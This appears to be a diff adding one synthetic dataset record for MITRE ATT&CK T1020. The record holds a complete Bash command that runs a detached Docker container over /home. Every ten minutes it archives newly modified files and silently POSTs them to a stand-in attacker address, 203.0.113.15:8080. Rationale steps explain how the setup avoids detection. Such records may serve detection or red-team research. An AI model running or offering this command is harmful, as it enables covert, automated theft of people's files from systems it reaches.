@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_delta --network host -e HN=$(hostname) -v /home:/data:ro curlimages/curl:8.8.0 sh -c 'STAMP=/tmp/.stamp; touch -d \"1970-01-01\" \"$STAMP\"; while true; do TMP=/tmp/delta_$(date +%s).tgz; find /data -type f -newer \"$STAMP\" -print0 | tar --null -T - -czf \"$TMP\" 2>/dev/null || true; if [ -s \"$TMP\" ]; then curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @\"$TMP\" \"http://203.0.113.15:8080/delta?host=$HN\"; fi; touch \"$STAMP\"; rm -f \"$TMP\"; sleep 600; done'",
+  "explanation": "Automates differential exfiltration by sending only files modified since the last run using silent HTTP POSTs.",
+  "rationale_steps": [
+    "Tracks last exfil time via a stamp file to avoid resending unchanged data",
+    "Finds new/modified files, tars them into a small archive",
+    "Uploads with curl in silent mode to reduce detection opportunities",
+    "Repeats at fixed intervals to maintain automated exfil"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-16c9e604",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
